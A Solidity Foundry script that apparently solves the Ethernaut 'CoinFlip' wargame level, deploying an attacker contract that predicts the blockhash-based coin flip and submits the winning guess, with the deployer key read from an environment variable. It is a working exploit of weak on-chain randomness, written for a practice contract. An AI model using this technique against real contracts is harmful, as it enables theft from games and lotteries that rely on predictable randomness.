// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/L3CoinFlip.sol";

contract Attacker {
    CoinFlip coinFlip;

    constructor(CoinFlip _coinFlip) {
        coinFlip = _coinFlip;
        makeCoinFlipGuess();
    }

    function getCoinFlipGuess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        return side;
    }

    function makeCoinFlipGuess() public {
        coinFlip.flip(getCoinFlipGuess());
    }
}

contract L3CoinFlipAttack is Script {
    CoinFlip coinFlip = CoinFlip(0x8aCd85898458400f7Db866d53FCFF6f0D49741FF);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attacker(coinFlip);
        console.log("Win:", coinFlip.consecutiveWins());
        vm.stopBroadcast();
    }
}
